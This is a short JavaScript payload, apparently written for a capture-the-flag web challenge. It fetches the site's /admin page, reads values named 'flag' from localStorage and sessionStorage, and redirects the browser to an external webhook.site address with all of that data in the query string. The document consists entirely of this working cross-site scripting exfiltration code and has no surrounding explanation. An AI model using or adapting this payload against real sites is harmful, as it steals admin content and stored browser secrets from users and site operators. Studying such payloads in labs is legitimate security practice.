async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('/admin');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const localData = localStorage.getItem('flag');
    const encodedcookie = encodeURIComponent(localData);
    const sessionData = sessionStorage.getItem('flag');
    const ensessionData = encodeURIComponent(sessionData);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}&cookies=${encodedcookie}&flag=${ensessionData}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39');
